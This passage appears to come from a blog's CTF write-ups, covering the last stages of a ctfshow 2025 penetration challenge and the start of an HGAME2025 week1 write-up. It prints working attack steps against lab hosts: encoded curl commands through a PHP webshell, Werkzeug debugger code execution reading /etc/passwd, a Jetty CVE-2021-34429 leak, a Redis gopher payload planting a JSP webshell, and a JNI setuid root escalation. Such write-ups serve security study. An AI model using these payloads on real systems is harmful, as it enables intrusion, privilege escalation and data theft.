class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZD4uXC9sb2dcL21haW4ubG9nJykmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&gt;.\/log\/main.log&#x27;)&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>再访问main.log即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAtdiAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlo4R1pQdy5vZ2hpOUJ4NXRZMl85d2l6MDJlSjlSVWR4UDQiICAiaHR0cDovLzE3Mi4yLjIzNy42Ojg4ODgvZ2V0X2xvZ19jb250ZW50P2xvZ0ZpbGU9bWFpbi5sb2ci&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl -v -b <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-223635.png"></p><p>也可以用大佬写的interactive shell脚本，内容根据情况修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="comment"># data = urllib.parse.quote(data)</span></span><br><span class="line">    <span class="comment"># python_shell = &#x27;curl --cookie &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk;__wzd2fb5743f98b45463400e=1736152460|4bfc86e353c8&quot; &quot;http://172.2.252.6:8888/console?__debugger__=yes&amp;s=eABh7cMeNgMKri1DSi4w&amp;cmd=&#123;&#125;&amp;frm=1&quot;&#x27;.format(data)</span></span><br><span class="line">    <span class="comment"># python_shell = base64.b64encode(python_shell.encode()).decode()</span></span><br><span class="line">    data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    <span class="comment"># normal_shell = &#x27;echo &quot;&#x27; + data + &#x27;&quot; | base64 -d | sh&#x27;</span></span><br><span class="line">    normal_shell=data</span><br><span class="line">    <span class="comment"># url = &quot;https://543f943e-6f90-43b4-bfc8-ee86d2fb3f34.challenge.ctf.show/downloadTaskFile?url=http://172.2.239.5/1.php?1=phpinfo();&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://9c30a725-a36d-4e54-874b-f088dc3d80cf.challenge.ctf.show/downloadTaskFile?url=http://172.2.233.5/1.php?1=system(base64_decode(\&quot;&quot;</span>+normal_shell+<span class="string">&quot;\&quot;));&quot;</span></span><br><span class="line">    response = requests.get(url, verify=<span class="literal">False</span>, headers=&#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTgzNjIzMjMxN30.nB-6uWH-wBxU3e_QJLw1O_TaPARU5o2DUe-y1TvqX5w&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        <span class="comment"># print(response.json())</span></span><br><span class="line">        <span class="comment"># print(response.json()[&quot;url&quot;])</span></span><br><span class="line">        <span class="built_in">print</span>(response.json()[<span class="string">&quot;file_content&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><code>flag10：ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><h4 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h4><p>需要<strong>提交redis的密码</strong></p><p>这里继续横向渗透，发现7的8080端口存在jetty服务，Eclipse Jetty是一个Java Web 服务器和Java Servlet容器。</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-144914.png"></p><p>看了下服务器版本为<code>Jetty(9.4.40.v20210413)</code>，直接搜：<a href="https://xz.aliyun.com/news/11267?u_atoken=5cf7bf3f92f98efc3c5a4e7ef58dac09&u_asig=0a47315217408114017564414e00c9/eb699">jetty常用渗透总结</a></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-145338.png"></p><p>发现存在信息泄露，<strong>CVE-2021-34429</strong>直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/.%00/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-145629.png"></p><p>port为6380</p><p><code>flag11：ctfshow&#123;ctfshow_2025&#125;</code></p><h4 id="功亏一篑"><a href="#功亏一篑" class="headerlink" title="功亏一篑"></a>功亏一篑</h4><p>需要<strong>提交 &#x2F;dylan.txt 中的key</strong></p><p><code>/dylan.txt</code>在根目录里，而前面我们拿到了redis密码，这里自然要登陆redis</p><p>登录redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJkaWN0Oi8vMTcyLjIuMTM5Ljc6NjM4MC9hdXRoOmN0ZnNob3dfMjAyNSI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;dict://172.2.139.7:6380/auth:ctfshow_2025&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-152329.png"></p><p>构造gopher请求写jsp马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">set mars &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename 2.jsp</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJnb3BoZXI6Ly8xNzIuMi4xMzkuNzo2MzgwL19hdXRoJTIwY3Rmc2hvd18yMDI1JTBBc2V0JTIwbWFycyUyMCUyMiUzQyUyNSUyMFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3JTIwU3RyaW5nJTVCJTVEJTdCJTVDJTIyc2glNUMlMjIlMkMlNUMlMjItYyU1QyUyMiUyQ3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCU1QyUyMmNtZCU1QyUyMiklN0QpJTNCJTI1JTNFJTIyJTBBY29uZmlnJTIwc2V0JTIwZGlyJTIwJTJGb3B0JTJGamV0dHklMkZ3ZWJhcHBzJTJGUk9PVCUyRiUwQWNvbmZpZyUyMHNldCUyMGRiZmlsZW5hbWUlMjAyLmpzcCUwQXNhdmUlMEFxdWl0Ig==&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-154409.png"></p><p>由于没有回显，所以需要带到其他文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=ls%20/&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-155853.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-160000.png"></p><p><code>flag12：ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><h4 id="今日方知我是我"><a href="#今日方知我是我" class="headerlink" title="今日方知我是我"></a>今日方知我是我</h4><p>需要<strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>需要提权</p><p>查suid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-161120.png"></p><p>没有可以利用的</p><p>查cap权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-161358.png"></p><p>发现java有setuid权限</p><p>不会Java提权，只能参考官方wp的做法：</p><p>写入SetUID.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>写入SetUID.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=java%20-Djava.library.path=/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-164814.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">致信后来者：</span><br><span class="line"></span><br><span class="line">同志你好！我是81192，我不是第一批81192，也不会是最后一批81192，81192从来不是一个人。</span><br><span class="line">现在，同志，你也是81192的一员了。</span><br><span class="line"></span><br><span class="line">我已经清理和收集了他们的所有资料并传回总部，但是在我离开的时候，被dylan投毒，我已经感染了他们的朊病毒。</span><br><span class="line">我把我的最后的话，都放到了一个网址里面，你在他们的任务中心中，用dylan身份登陆后，在管理菜单中 访问下面地址，就能看到了！再见了，同志！</span><br><span class="line">网址是：http://8.11.9.2</span><br><span class="line"></span><br><span class="line">现在我命令你：</span><br><span class="line">我已无法返航，请继续前进！请继续前进！</span><br><span class="line"></span><br><span class="line">（完）</span><br></pre></td></tr></table></figure><p><code>flag13：ctfshow&#123;http://8.11.9.2&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2025 week1</title>
      <link href="/2025/02/23/HGAME2025-week1/"/>
      <url>/2025/02/23/HGAME2025-week1/</url>
      
        <content type="html"><![CDATA[<h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a>Pacman</h2><p>js前端题，发现两个可疑的gift：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br><span class="line">aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br></pre></td></tr></table></figure><p>随波逐流直接梭，是个栅栏加密：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250206-171247.png"></p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250206-171412.png"></p><p>第一个为真flag</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a>BandBomb</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    